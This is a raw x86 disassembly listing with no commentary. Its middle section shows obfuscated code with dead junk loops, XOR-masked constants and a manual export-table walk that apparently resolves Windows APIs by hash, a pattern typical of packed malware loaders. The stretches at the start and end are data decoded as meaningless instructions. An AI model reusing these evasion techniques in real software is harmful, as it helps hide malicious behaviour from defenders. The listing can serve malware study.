  40a79e:	int3   
  40a79f:	pop    eax
  40a7a0:	in     al,dx
  40a7a1:	mov    edi,0x4ac4b5c7
  40a7a6:	pop    esi
  40a7a7:	retf   0x9fed
  40a7aa:	pop    ecx
  40a7ab:	out    0x3c,al
  40a7ad:	sub    DWORD PTR [eax+0x6c7ddeed],ecx
  40a7b3:	ror    dh,cl
  40a7b5:	out    0x2f,al
  40a7b7:	dec    ebp
  40a7b8:	add    BYTE PTR [ebx+edi*4+0x433ca070],dh
  40a7bf:	add    eax,0x940372d6
  40a7c4:	mov    ds:0xc6d433f5,al
  40a7c9:	fsub   DWORD PTR [esi+0x70]
  40a7cc:	push   edx
  40a7cd:	adc    bh,ch
  40a7cf:	int    0x9
  40a7d1:	add    al,0x18
  40a7d3:	cmp    eax,0xeb173456
  40a7d8:	gs cs cmp al,0x24
  40a7dc:	jecxz  0x40a801
  40a7de:	mov    edi,0xa6f1c878
  40a7e3:	movups xmm7,XMMWORD PTR [edx-0x7e513f84]
  40a7ea:	sub    DWORD PTR ds:0x9321a981,esi
  40a7f0:	retf   0x31f7
  40a7f3:	xchg   ebp,eax
  40a7f4:	mov    cl,0x1f
  40a7f6:	jmp    0x5482:0xf37b8c66
  40a7fd:	jns    0x40a854
  40a7ff:	cmp    eax,DWORD PTR [ecx+esi*4-0x1955ea90]
  40a806:	jbe    0x40a791
  40a808:	push   cs
  40a809:	mov    cl,0x56
  40a80b:	rcl    DWORD PTR [ecx],0xde
  40a80e:	rol    esi,0x91
  40a811:	mov    ebx,0x1fefaf87
  40a816:	es aas 
  40a818:	jae    0x40a856
  40a81a:	xlat   BYTE PTR ds:[ebx]
  40a81b:	inc    ebx
  40a81c:	jne    0x40a88b
  40a81e:	jmp    0x40a83d
  40a820:	inc    esi
  40a821:	(bad)  
  40a823:	add    bh,ah
  40a825:	daa    
  40a826:	sbb    DWORD PTR [edi-0x4b],ecx
  40a829:	mov    dl,0xd4
  40a82b:	xchg   BYTE PTR [ebp+edx*8-0x8],dl
  40a82f:	xchg   BYTE PTR [ebx+0x5f8c1dbb],dh
  40a835:	sti    
  40a836:	and    eax,0xd653bd5e
  40a83b:	int3   
  40a83c:	clc    
  40a83d:	fs mov ch,0x23
  40a840:	mov    DWORD PTR [ecx+0x56eb1d8c],0xb5c50ef1
  40a84a:	dec    eax
  40a84b:	loope  0x40a818
  40a84d:	dec    esp
  40a84e:	mov    dl,0xa5
  40a850:	test   ebp,ecx
  40a852:	daa    
  40a853:	(bad)  
  40a854:	push   edx
  40a855:	or     BYTE PTR ds:0x353f4b03,dl
  40a85b:	loop   0x40a805
  40a85d:	sti    
  40a85e:	rcl    DWORD PTR [esi-0x236edcc3],1
  40a864:	call   0xadfb927e
  40a869:	fdiv   st,st(0)
  40a86b:	pushf  
  40a86c:	repz dec esi
  40a86e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a86f:	adc    edi,DWORD PTR [edi-0x41]
  40a872:	jle    0x40a85c
  40a874:	scas   eax,DWORD PTR es:[edi]
  40a875:	push   ebp
  40a876:	inc    ebp
  40a877:	add    DWORD PTR [edi-0x250538ae],ebx
  40a87d:	adc    al,0xca
  40a87f:	xchg   ebp,eax
  40a880:	adc    eax,0x73d3acd4
  40a885:	add    edx,DWORD PTR [eax-0x6f]
  40a888:	pop    eax
  40a889:	jbe    0x40a817
  40a88b:	and    al,0x8
  40a88d:	jmp    0x40a878
  40a88f:	mov    BYTE PTR [edx-0x6f5c2a7c],0x2a
  40a896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a897:	(bad)  
  40a898:	jp     0x40a823
  40a89a:	push   ebx
  40a89b:	jne    0x40a88f
  40a89d:	and    BYTE PTR [edi+ebp*4],0x80
  40a8a1:	push   esi
  40a8a2:	sub    edi,DWORD PTR [ebx-0x12]
  40a8a5:	sbb    BYTE PTR [eax],bl
  40a8a7:	xchg   ebp,eax
  40a8a8:	pusha  
  40a8a9:	out    0xa8,eax
  40a8ab:	push   es
  40a8ac:	jbe    0x40a873
  40a8ae:	retf   
  40a8af:	push   edi
  40a8b0:	jl     0x40a919
  40a8b2:	imul   edi,DWORD PTR [edi],0x7bfa6462
  40a8b8:	call   0x6fe7:0xa7dc4acb
  40a8bf:	and    DWORD PTR [ebp+0x6471d3c7],ecx
  40a8c5:	add    al,0xcf
  40a8c7:	adc    cl,dh
  40a8c9:	or     ebp,ebp
  40a8cb:	jmp    0xa0816d87
  40a8d0:	pushf  
  40a8d1:	sahf   
  40a8d2:	dec    eax
  40a8d3:	popf   
  40a8d4:	leave  
  40a8d5:	push   eax
  40a8d6:	es aaa 
  40a8d8:	pop    ds
  40a8d9:	out    dx,eax
  40a8da:	or     ah,BYTE PTR [eax-0x1f2be753]
  40a8e0:	adc    eax,0x34d0a3bf
  40a8e5:	imul   esp,DWORD PTR [ebx-0x1d],0xfffffffd
  40a8e9:	sbb    al,0xf0
  40a8eb:	add    DWORD PTR [ebx-0xa],ebx
  40a8ee:	aam    0xf4
  40a8f0:	sbb    edi,DWORD PTR [ebp+esi*8+0x741b5dba]
  40a8f7:	add    eax,0x28556f60
  40a8fc:	jmp    0x52916c9c
  40a901:	cmp    al,0x5c
  40a903:	sub    dh,BYTE PTR fs:[edx]
  40a906:	ret    0x2bcd
  40a909:	cld    
  40a90a:	xor    al,0x33
  40a90c:	loopne 0x40a931
  40a90e:	or     eax,0xb0f3a36f
  40a913:	add    dl,BYTE PTR [esi-0x508d2cf8]
  40a919:	dec    edi
  40a91a:	xor    eax,0x6b4419f8
  40a91f:	sar    BYTE PTR [esp+ebx*4-0x5ea88c66],0x0
  40a927:	pusha  
  40a928:	stos   DWORD PTR es:[edi],eax
  40a929:	cmp    al,0xb9
  40a92b:	call   0x2969627b
  40a930:	xor    edx,DWORD PTR [esi]
  40a932:	fild   DWORD PTR [ebx]
  40a934:	cwde   
  40a935:	pop    ebx
  40a936:	cmp    al,cl
  40a938:	loope  0x40a8e8
  40a93a:	mov    cl,0xe
  40a93c:	sub    esi,DWORD PTR [eax-0x7b]
  40a93f:	xchg   ecx,eax
  40a940:	mov    ah,0x1f
  40a942:	jns    0x40a9bb
  40a944:	xchg   ebx,eax
  40a945:	out    dx,al
  40a946:	rol    BYTE PTR [edi-0x311ab0e8],cl
  40a94c:	out    0x41,eax
  40a94e:	xchg   ecx,eax
  40a94f:	push   eax
  40a950:	aad    0xed
  40a952:	int3   
  40a953:	mov    bh,0x74
  40a955:	jb     0x40a94e
  40a957:	xchg   esi,eax
  40a958:	(bad)  
  40a959:	call   0x4656:0x75d22171
  40a960:	xor    eax,0x87c61dca
  40a965:	and    al,0x26
  40a967:	in     al,dx
  40a968:	xor    DWORD PTR [eax+esi*1+0x13],0x6cb1c62c
  40a970:	cmp    DWORD PTR [edi+0x61],ecx
  40a973:	mov    bl,0x41
  40a975:	div    DWORD PTR [esi+0x66a641f0]
  40a97b:	(bad)  
  40a97c:	popa   
  40a97d:	pop    eax
  40a97e:	jge    0x40a9e2
  40a980:	lds    ecx,FWORD PTR fs:[ecx+0x64]
  40a984:	lods   al,BYTE PTR ds:[esi]
  40a985:	sub    edx,DWORD PTR [esi+0x6ec8fbd2]
  40a98b:	int    0x87
  40a98d:	inc    DWORD PTR [esi+0x38]
  40a990:	push   cs
  40a991:	mov    cl,0x54
  40a993:	mov    ah,0x9e
  40a995:	fnsave [edx+0x0]
  40a998:	inc    bh
  40a99a:	ins    BYTE PTR es:[edi],dx
  40a99b:	push   eax
  40a99c:	gs add al,0x21
  40a99f:	(bad)  
  40a9a0:	icebp  
  40a9a1:	push   ss
  40a9a2:	pop    ds
  40a9a3:	loope  0x40a935
  40a9a5:	pusha  
  40a9a6:	add    al,0x51
  40a9a8:	pop    ebx
  40a9a9:	iret   
  40a9aa:	cli    
  40a9ab:	inc    esp
  40a9ac:	call   0x7d98363d
  40a9b1:	sbb    al,0xb1
  40a9b3:	jb     0x40aa24
  40a9b5:	mov    eax,ds:0xa40c0ced
  40a9ba:	push   0x3c86470b
  40a9bf:	sub    DWORD PTR [edi-0x44],edi
  40a9c2:	les    eax,FWORD PTR [ebx]
  40a9c4:	pop    edx
  40a9c5:	clc    
  40a9c6:	imul   esi,DWORD PTR [edi-0x76655877],0xfffffffa
  40a9cd:	and    al,dl
  40a9cf:	ret    0xecb8
  40a9d2:	int3   
  40a9d3:	xlat   BYTE PTR ds:[ebx]
  40a9d4:	pop    ds
  40a9d5:	cli    
  40a9d6:	fsubp  st(4),st
  40a9d8:	loope  0x40a9cc
  40a9da:	out    0xbe,eax
  40a9dc:	pop    eax
  40a9dd:	jp     0x40a9bb
  40a9df:	ins    DWORD PTR es:[edi],dx
  40a9e0:	jns    0x40a9ad
  40a9e2:	hlt    
  40a9e3:	in     al,0xda
  40a9e5:	out    0xba,al
  40a9e7:	call   0xf0e0:0x7a8083e3
  40a9ee:	xchg   ebx,eax
  40a9ef:	sub    eax,eax
  40a9f1:	mov    ds,WORD PTR [edi]
  40a9f3:	shr    cl,0xc8
  40a9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9f8:	loop   0x40a9ad
  40a9fa:	cwde   
  40a9fb:	(bad)  
  40a9fc:	ror    BYTE PTR [ecx+ecx*1],0x80
  40aa00:	sahf   
  40aa01:	out    0x8a,eax
  40aa03:	and    DWORD PTR ds:0x5cd92056,ebp
  40aa09:	push   edi
  40aa0a:	sub    dl,ah
  40aa0c:	mov    eax,ds:0x84c37537
  40aa11:	fs inc eax
  40aa13:	add    eax,0x30bde987
  40aa18:	cwde   
  40aa19:	ja     0x40aa04
  40aa1b:	cwde   
  40aa1c:	push   edi
  40aa1d:	mov    ebx,0x173923d9
  40aa22:	pop    esp
  40aa23:	pushf  
  40aa24:	(bad)  
  40aa25:	fcmovne st,st(6)
  40aa27:	push   edx
  40aa28:	jl     0x40a9b6
  40aa2a:	mov    edi,0x1415ff01
  40aa2f:	push   eax
  40aa30:	inc    edx
  40aa31:	add    BYTE PTR [eax-0x69],ch
  40aa34:	xchg   DWORD PTR [ecx+0x80d8197],ecx
  40aa3a:	mov    al,ds:0xd0080042
  40aa3f:	inc    edx
  40aa40:	add    bh,bh
  40aa42:	adc    eax,0x425004
  40aa47:	and    DWORD PTR ds:0x42c01c,0x0
  40aa51:	mov    ebx,DWORD PTR ds:0x42c01c
  40aa57:	inc    ebx
  40aa58:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa5e:	cmp    DWORD PTR ds:0x42c01c,0x5
  40aa65:	jne    0x40aa76
  40aa6b:	push   0x57f5
  40aa70:	call   DWORD PTR ds:0x42504c
  40aa76:	cmp    DWORD PTR ds:0x42c01c,0x4
  40aa7d:	jne    0x40aa92
  40aa83:	xor    ebx,ebx
  40aa85:	xor    ebx,DWORD PTR ds:0x42c01c
  40aa8b:	inc    ebx
  40aa8c:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa92:	cmp    DWORD PTR ds:0x42c01c,0x10
  40aa99:	jb     0x40aa51
  40aa9f:	xor    eax,eax
  40aaa1:	xor    eax,DWORD PTR ds:0x42a014
  40aaa7:	xor    DWORD PTR ds:0x42d018,eax
  40aaad:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  40aab4:	or     ecx,DWORD PTR ds:0x42d008
  40aaba:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aac1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aac4:	or     DWORD PTR ds:0x42b014,edi
  40aaca:	mov    ebx,0x7510893
  40aacf:	xor    eax,eax
  40aad1:	or     eax,DWORD PTR ds:0x423dcb
  40aad7:	mov    eax,DWORD PTR [eax]
  40aad9:	or     DWORD PTR ds:0x42d018,eax
  40aadf:	xor    ecx,ebx
  40aae1:	not    eax
  40aae3:	mov    eax,0x3272db
  40aae8:	or     DWORD PTR ds:0x42c010,0x42900c
  40aaf2:	add    ecx,eax
  40aaf4:	mov    DWORD PTR [ebp-0x1c],ecx
  40aaf7:	mov    DWORD PTR ds:0x42c014,0x14
  40ab01:	cmp    DWORD PTR ds:0x42c014,0x0
  40ab08:	je     0x40aba7
  40ab0e:	cmp    DWORD PTR ds:0x42c014,0x2
  40ab15:	jne    0x40ab29
  40ab1b:	push   DWORD PTR [ebp-0x28]
  40ab1e:	push   0x4244d9
  40ab23:	call   DWORD PTR ds:0x425010
  40ab29:	cmp    DWORD PTR ds:0x42c014,0x3
  40ab30:	jne    0x40ab43
  40ab36:	mov    ecx,DWORD PTR ds:0x42c014
  40ab3c:	dec    ecx
  40ab3d:	mov    DWORD PTR ds:0x42c014,ecx
  40ab43:	mov    ecx,DWORD PTR ds:0x42c014
  40ab49:	dec    ecx
  40ab4a:	mov    DWORD PTR ds:0x42c014,ecx
  40ab50:	jmp    0x40ab01
  40ab55:	mov    DWORD PTR ds:0x42a018,0x12
  40ab5f:	cmp    DWORD PTR ds:0x42a018,0x0
  40ab66:	je     0x40aba7
  40ab6c:	cmp    DWORD PTR ds:0x42a018,0x1a
  40ab73:	jne    0x40ab85
  40ab79:	push   DWORD PTR [ebp-0x1c]
  40ab7c:	push   DWORD PTR [ebp-0x18]
  40ab7f:	call   DWORD PTR ds:0x425018
  40ab85:	mov    ecx,DWORD PTR ds:0x42a018
  40ab8b:	dec    ecx
  40ab8c:	mov    DWORD PTR ds:0x42a018,ecx
  40ab92:	jmp    0x40ab5f
  40ab97:	xor    ecx,ecx
  40ab99:	xor    ecx,DWORD PTR ds:0x424542
  40ab9f:	mov    ecx,DWORD PTR [ecx]
  40aba1:	sbb    DWORD PTR ds:0x42a00c,ecx
  40aba7:	mov    ecx,DWORD PTR [ebp+0x14]
  40abaa:	test   ecx,ecx
  40abac:	je     0x40ac29
  40abb2:	and    DWORD PTR ds:0x42c014,edi
  40abb8:	mov    ecx,DWORD PTR [ebp+0x14]
  40abbb:	mov    DWORD PTR ds:0x42c014,0x11
  40abc5:	cmp    DWORD PTR ds:0x42c014,0x0
  40abcc:	je     0x40ac1e
  40abd2:	cmp    DWORD PTR ds:0x42c014,0x5
  40abd9:	jne    0x40abf2
  40abdf:	push   0x429028
  40abe4:	push   DWORD PTR [ebp-0x20]
  40abe7:	push   0x42434d
  40abec:	call   DWORD PTR ds:0x42501c
  40abf2:	cmp    DWORD PTR ds:0x42c014,0x6
  40abf9:	jne    0x40ac0c
  40abff:	mov    edi,DWORD PTR ds:0x42c014
  40ac05:	dec    edi
  40ac06:	mov    DWORD PTR ds:0x42c014,edi
  40ac0c:	mov    edi,DWORD PTR ds:0x42c014
  40ac12:	dec    edi
  40ac13:	mov    DWORD PTR ds:0x42c014,edi
  40ac19:	jmp    0x40abc5
  40ac1e:	mov    ecx,DWORD PTR [ecx]
  40ac20:	xor    DWORD PTR ds:0x42a018,ecx
  40ac26:	mov    DWORD PTR [ebp-0x1c],ecx
  40ac29:	adc    DWORD PTR ds:0x429024,edi
  40ac2f:	mov    ecx,0x7665
  40ac34:	imul   edx,eax
  40ac37:	mov    DWORD PTR ds:0x42d00c,0x1b
  40ac41:	cmp    DWORD PTR ds:0x42d00c,0x0
  40ac48:	je     0x40ac9b
  40ac4e:	cmp    DWORD PTR ds:0x42d00c,0x4
  40ac55:	jne    0x40ac69
  40ac5b:	push   0x429020
  40ac60:	push   DWORD PTR [ebp-0x1c]
  40ac63:	call   DWORD PTR ds:0x425020
  40ac69:	cmp    DWORD PTR ds:0x42d00c,0x5
  40ac70:	jne    0x40ac83
  40ac76:	mov    edi,DWORD PTR ds:0x42d00c
  40ac7c:	dec    edi
  40ac7d:	mov    DWORD PTR ds:0x42d00c,edi
  40ac83:	mov    edi,DWORD PTR ds:0x42d00c
  40ac89:	dec    edi
  40ac8a:	mov    DWORD PTR ds:0x42d00c,edi
  40ac90:	jmp    0x40ac41
  40ac95:	xor    DWORD PTR ds:0x42b010,edi
  40ac9b:	mov    esi,0x76532
  40aca0:	add    edx,ecx
  40aca2:	xchg   esi,ecx
  40aca4:	or     edi,esi
  40aca6:	mov    edi,0x54354
  40acab:	movzx  ecx,BYTE PTR ds:0x42901c
  40acb2:	sbb    DWORD PTR ds:0x429000,ecx
  40acb8:	sub    edx,edi
  40acba:	mov    ecx,DWORD PTR [ebp-0x4]
  40acbd:	sbb    DWORD PTR ds:0x429028,0x4a48
  40acc7:	xor    ecx,ebx
  40acc9:	and    esi,DWORD PTR ds:0x42900c
  40accf:	add    ecx,eax
  40acd1:	mov    DWORD PTR [ebp-0x8],ecx
  40acd4:	mov    DWORD PTR ds:0x42b014,0x169
  40acde:	mov    ecx,DWORD PTR [ebp-0x14]
  40ace1:	add    esi,DWORD PTR ds:0x42b000
  40ace7:	xor    ecx,ebx
  40ace9:	add    DWORD PTR ds:0x42d00c,0x42d004
  40acf3:	add    ecx,eax
  40acf5:	mov    DWORD PTR [ebp-0x24],ecx
  40acf8:	and    esi,esi
  40acfa:	mov    ecx,DWORD PTR [ebp-0x4]
  40acfd:	and    DWORD PTR ds:0x42b000,0x0
  40ad07:	jmp    0x40ad19
  40ad0c:	mov    esi,DWORD PTR ds:0x42b000
  40ad12:	inc    esi
  40ad13:	mov    DWORD PTR ds:0x42b000,esi
  40ad19:	cmp    DWORD PTR ds:0x42b000,0x10
  40ad20:	jae    0x40ad70
  40ad26:	cmp    DWORD PTR ds:0x42b000,0x4
  40ad2d:	jne    0x40ad3e
  40ad33:	push   0x8810
  40ad38:	call   DWORD PTR ds:0x425028
  40ad3e:	cmp    DWORD PTR ds:0x42b000,0x3
  40ad45:	jne    0x40ad58
  40ad4b:	mov    esi,DWORD PTR ds:0x42b000
  40ad51:	inc    esi
  40ad52:	mov    DWORD PTR ds:0x42b000,esi
  40ad58:	jmp    0x40ad0c
  40ad5d:	movzx  esi,WORD PTR ds:0x42d00c
  40ad64:	adc    esi,DWORD PTR ds:0x42b018
  40ad6a:	mov    DWORD PTR ds:0x42d00c,esi
  40ad70:	xor    ecx,ebx
  40ad72:	add    ecx,eax
  40ad74:	add    esi,0x75ba
  40ad7a:	mov    DWORD PTR [ebp-0x30],ecx
  40ad7d:	or     ecx,DWORD PTR ds:0x42c010
  40ad83:	mov    esi,DWORD PTR [ebp-0x4]
  40ad86:	inc    ecx
  40ad87:	xor    esi,ebx
  40ad89:	mov    ecx,DWORD PTR ds:0x42452a
  40ad8f:	mov    ecx,DWORD PTR [ecx]
  40ad91:	adc    DWORD PTR ds:0x429020,ecx
  40ad97:	add    esi,eax
  40ad99:	mov    ecx,DWORD PTR [ebp-0x24]
  40ad9c:	sub    DWORD PTR ds:0x42c010,0x42c004
  40ada6:	sub    ecx,eax
  40ada8:	lea    edx,[esi-0x3272db]
  40adae:	xor    DWORD PTR ds:0x42a004,0x429028
  40adb8:	xor    ecx,ebx
  40adba:	xor    edx,ebx
  40adbc:	mov    DWORD PTR ds:0x42b00c,0x3cf6
  40adc6:	cmp    edx,ecx
  40adc8:	mov    DWORD PTR ds:0x42a008,0x130c
  40add2:	je     0x40afdf
  40add8:	sub    ecx,0x2467
  40adde:	mov    ecx,DWORD PTR [ebp-0x4]
  40ade1:	and    DWORD PTR ds:0x42c00c,0x42d01c
  40adeb:	xor    ecx,ebx
  40aded:	add    DWORD PTR ds:0x42b018,0x2ea9
  40adf7:	add    ecx,eax
  40adf9:	mov    DWORD PTR ds:0x42b000,0x737d
  40ae03:	cmp    esi,ecx
  40ae05:	mov    DWORD PTR ds:0x42b018,0x3d4e
  40ae0f:	jne    0x40afbc
  40ae15:	push   DWORD PTR [ebp+0x8]
  40ae18:	call   0x423b51
  40ae1d:	mov    DWORD PTR [ebp-0x18],eax
  40ae20:	mov    eax,DWORD PTR [ebp-0x4]
  40ae23:	xor    edi,ecx
  40ae25:	mov    ecx,DWORD PTR [ebp-0x18]
  40ae28:	xor    eax,ebx
  40ae2a:	and    DWORD PTR ds:0x42901c,0x0
  40ae34:	jmp    0x40ae46
  40ae39:	mov    edi,DWORD PTR ds:0x42901c
  40ae3f:	inc    edi
  40ae40:	mov    DWORD PTR ds:0x42901c,edi
  40ae46:	cmp    DWORD PTR ds:0x42901c,0x1d
  40ae4d:	jae    0x40ae90
  40ae53:	cmp    DWORD PTR ds:0x42901c,0x2c
  40ae5a:	jne    0x40ae85
  40ae60:	push   0x61ef
  40ae65:	push   0x288b
  40ae6a:	push   0x42d018
  40ae6f:	push   DWORD PTR [ebp-0x28]
  40ae72:	push   0x2975
  40ae77:	push   DWORD PTR [ebp-0x24]
  40ae7a:	push   0x26ce
  40ae7f:	call   DWORD PTR ds:0x42502c
  40ae85:	jmp    0x40ae39
  40ae8a:	or     DWORD PTR ds:0x42c010,ebx
  40ae90:	mov    edi,0x3272db
  40ae95:	add    eax,edi
  40ae97:	mov    DWORD PTR ds:0x42901c,0x5f35
  40aea1:	cmp    ecx,eax
  40aea3:	mov    DWORD PTR ds:0x42c018,0x19df
  40aead:	je     0x40b04f
  40aeb3:	sub    DWORD PTR ds:0x42d018,0x5f9c
  40aebd:	push   DWORD PTR [ebp-0x18]
  40aec0:	and    DWORD PTR ds:0x42b018,0x42b000
  40aeca:	push   DWORD PTR [ebp+0x8]
  40aecd:	dec    DWORD PTR ds:0x42a00c
  40aed3:	call   0x423c30
  40aed8:	or     DWORD PTR ds:0x42a014,0x42a00c
  40aee2:	mov    DWORD PTR [ebp-0x18],eax
  40aee5:	mov    eax,DWORD PTR [ebp-0x4]
  40aee8:	sbb    DWORD PTR ds:0x42a010,0x3b6d
  40aef2:	mov    ecx,DWORD PTR [ebp-0x18]
  40aef5:	xor    eax,ebx
  40aef7:	add    DWORD PTR ds:0x429004,0x42d004
  40af01:	add    eax,edi
  40af03:	mov    DWORD PTR ds:0x42a018,0x317f
  40af0d:	cmp    ecx,eax
  40af0f:	je     0x40b04f
  40af15:	mov    eax,DWORD PTR [ebp-0x18]
  40af18:	mov    eax,DWORD PTR [eax+0x18]
  40af1b:	mov    ecx,DWORD PTR ds:0x42d000
  40af21:	xor    DWORD PTR ds:0x42a014,ecx
  40af27:	mov    DWORD PTR [ebp-0x24],eax
  40af2a:	mov    eax,DWORD PTR [ebp-0x18]
  40af2d:	and    DWORD PTR ds:0x42b018,0x0
  40af37:	jmp    0x40af49
  40af3c:	mov    ecx,DWORD PTR ds:0x42b018
  40af42:	inc    ecx
  40af43:	mov    DWORD PTR ds:0x42b018,ecx
  40af49:	cmp    DWORD PTR ds:0x42b018,0x16
  40af50:	jae    0x40af77
  40af56:	cmp    DWORD PTR ds:0x42b018,0x20
  40af5d:	jne    0x40af6c
  40af63:	push   DWORD PTR [ebp-0x28]
  40af66:	call   DWORD PTR ds:0x425030
  40af6c:	jmp    0x40af3c
  40af71:	xor    ecx,DWORD PTR ds:0x42b01c
  40af77:	mov    ecx,DWORD PTR [ebp+0x8]
  40af7a:	add    ecx,DWORD PTR [eax+0x20]
  40af7d:	sub    eax,DWORD PTR ds:0x429024
  40af83:	mov    DWORD PTR [ebp-0x2c],ecx
  40af86:	mov    eax,DWORD PTR [ebp-0x18]
  40af89:	inc    ecx
  40af8a:	mov    ecx,DWORD PTR [ebp+0x8]
  40af8d:	add    ecx,DWORD PTR [eax+0x24]
  40af90:	mov    DWORD PTR [ebp-0x34],ecx
  40af93:	xor    DWORD PTR ds:0x42a004,edi
  40af99:	mov    eax,DWORD PTR [ebp-0x18]
  40af9c:	or     DWORD PTR ds:0x42a000,ebx
  40afa2:	mov    ecx,DWORD PTR [ebp+0x8]
  40afa5:	or     DWORD PTR ds:0x42a008,0x109d
  40afaf:	add    ecx,DWORD PTR [eax+0x1c]
  40afb2:	mov    eax,edi
  40afb4:	mov    DWORD PTR [ebp-0x18],ecx
  40afb7:	jmp    0x40b017
  40afbc:	mov    ecx,DWORD PTR [ebp-0x2c]
  40afbf:	mov    edx,DWORD PTR [ebp+0x8]
  40afc2:	add    edx,DWORD PTR [ecx+esi*4]
  40afc5:	mov    DWORD PTR [ebp-0x28],edx
  40afc8:	mov    ecx,DWORD PTR [ebp-0x4]
  40afcb:	mov    edx,DWORD PTR [ebp-0x28]
  40afce:	xor    ecx,ebx
  40afd0:	add    ecx,eax
  40afd2:	cmp    edx,ecx
  40afd4:	je     0x40b017
  40afda:	jmp    0x40b003
  40afdf:	mov    ecx,DWORD PTR [ebp-0x4]
  40afe2:	mov    edx,DWORD PTR [ebp-0x8]
  40afe5:	xor    ecx,ebx
  40afe7:	add    ecx,eax
  40afe9:	cmp    edx,ecx
  40afeb:	je     0x40b05b
  40aff1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aff4:	mov    edx,DWORD PTR [ebp-0x30]
  40aff7:	xor    ecx,ebx
  40aff9:	add    ecx,eax
  40affb:	cmp    edx,ecx
  40affd:	je     0x40b06a
  40b003:	lea    eax,[ebp-0x8]
  40b006:	push   eax
  40b007:	push   DWORD PTR [ebp-0x28]
  40b00a:	push   DWORD PTR [ebp+0xc]
  40b00d:	call   0x401058
  40b012:	mov    eax,0x3272db
  40b017:	mov    ecx,DWORD PTR [ebp-0x4]
  40b01a:	mov    edx,DWORD PTR [ebp-0x8]
  40b01d:	xor    ecx,ebx
  40b01f:	add    ecx,eax
  40b021:	cmp    edx,ecx
  40b023:	je     0x40b03e
  40b029:	mov    ecx,DWORD PTR [ebp-0x34]
  40b02c:	movzx  ecx,WORD PTR [ecx+esi*2]
  40b030:	mov    edx,DWORD PTR [ebp-0x18]
  40b033:	mov    ecx,DWORD PTR [edx+ecx*4]
  40b036:	mov    DWORD PTR [ebp-0x38],ecx
  40b039:	jmp    0x40afdf
  40b03e:	mov    ecx,DWORD PTR [ebp-0x14]
  40b041:	xor    ecx,ebx
  40b043:	lea    esi,[esi+ecx*1+0x3272db]
  40b04a:	jmp    0x40ad99
  40b04f:	mov    eax,DWORD PTR [ebp-0x4]
  40b052:	xor    eax,ebx
  40b054:	add    eax,edi
  40b056:	jmp    0x40f898
  40b05b:	mov    eax,DWORD PTR [ebp-0x4]
  40b05e:	xor    eax,ebx
  40b060:	add    eax,0x3272db
  40b065:	jmp    0x40f898
  40b06a:	mov    ecx,DWORD PTR [ebp-0x38]
  40b06d:	add    ecx,DWORD PTR [ebp+0x8]
  40b070:	mov    DWORD PTR [ebp-0x10],ecx
  40b073:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b076:	test   ecx,ecx
  40b078:	je     0x40d4be
  40b07e:	mov    DWORD PTR [ebp-0x20],0x0
  40b085:	push   0x3
  40b087:	xor    edx,edx
  40b089:	pop    edx
  40b08a:	add    edx,0x8
  40b08d:	push   edx
  40b08e:	pop    ecx
  40b08f:	push   0x6
  40b091:	dec    ecx
  40b092:	pop    ebx
  40b093:	dec    ebx
  40b094:	xchg   ebx,ecx
  40b096:	sub    ebx,ecx
  40b098:	xchg   ebx,ecx
  40b09a:	dec    ecx
  40b09b:	mov    eax,DWORD PTR [ebp-0x1c]
  40b09e:	imul   eax,ecx
  40b0a1:	sub    esp,eax
  40b0a3:	mov    DWORD PTR [ebp-0x20],esp
  40b0a6:	mov    eax,DWORD PTR [ebp-0x4]
  40b0a9:	mov    ecx,0x7510893
  40b0ae:	xor    eax,ecx
  40b0b0:	mov    edx,0x3272db
  40b0b5:	add    eax,edx
  40b0b7:	mov    DWORD PTR [ebp+0x8],eax
  40b0ba:	mov    eax,DWORD PTR [ebp-0x14]
  40b0bd:	xor    eax,ecx
  40b0bf:	add    eax,edx
  40b0c1:	mov    edx,DWORD PTR [ebp+0x14]
  40b0c4:	jmp    0x40d429
  40b0c9:	fidiv  DWORD PTR [ecx+0x21]
  40b0cc:	jb     0x40b137
  40b0ce:	xor    ch,BYTE PTR [ecx-0x57]
  40b0d1:	ss pop es
  40b0d3:	add    eax,0xc7b0ea9b
  40b0d8:	icebp  
  40b0d9:	call   0x3aa313d3
  40b0de:	pop    edi
  40b0df:	bound  esp,QWORD PTR [edx-0x1b]
  40b0e2:	pop    esi
  40b0e3:	dec    edi
  40b0e4:	rcr    BYTE PTR [edx-0x7671ad5f],0x88
  40b0eb:	mov    ds:0x55820b98,al
  40b0f0:	xchg   ebx,eax
  40b0f1:	mov    bh,0x2a
  40b0f3:	push   es
  40b0f4:	arpl   WORD PTR [esi+esi*1-0x111cf88d],si
  40b0fb:	(bad)  
  40b0fd:	mul    DWORD PTR [esi-0x703730e9]
  40b103:	mov    ds,esp
  40b105:	pop    ss
  40b106:	aam    0x85
  40b108:	ss mov bl,0xe7
  40b10b:	ret    
  40b10c:	xchg   edx,eax
  40b10d:	stc    
  40b10e:	daa    
  40b10f:	sti    
  40b110:	jp     0x40b11c
  40b112:	inc    ebx
  40b113:	mov    DWORD PTR [ecx-0x47],0x95892503
  40b11a:	std    
  40b11b:	inc    edi
  40b11c:	mov    ds:0x185f45df,eax
  40b121:	(bad)  
  40b122:	shl    BYTE PTR [ecx],cl
  40b124:	clc    
  40b125:	cld    
  40b126:	or     ebp,eax
  40b128:	jb     0x40b0bb
  40b12a:	add    cl,dh
  40b12c:	push   ecx
  40b12d:	test   al,0x95
  40b12f:	mov    ebp,0x566cb626
  40b134:	pop    ebp
  40b135:	jns    0x40b12b
  40b137:	pop    ds
  40b138:	(bad)  
  40b13a:	mov    ecx,0x1d09286b
  40b13f:	adc    ah,BYTE PTR [ebx-0x3d444443]
  40b145:	cmp    DWORD PTR ds:0x740177a8,esi
  40b14b:	or     bh,BYTE PTR [ebx+0x1415ac25]
  40b151:	test   DWORD PTR [edx],esi
  40b153:	loopne 0x40b117
  40b155:	push   esp
  40b156:	fs push ss
  40b158:	sub    DWORD PTR [ebx+0x66],0x2260c67b
  40b15f:	retf   
  40b160:	mov    BYTE PTR [esi],dh
  40b162:	repz scas al,BYTE PTR es:[edi]
  40b164:	popf   
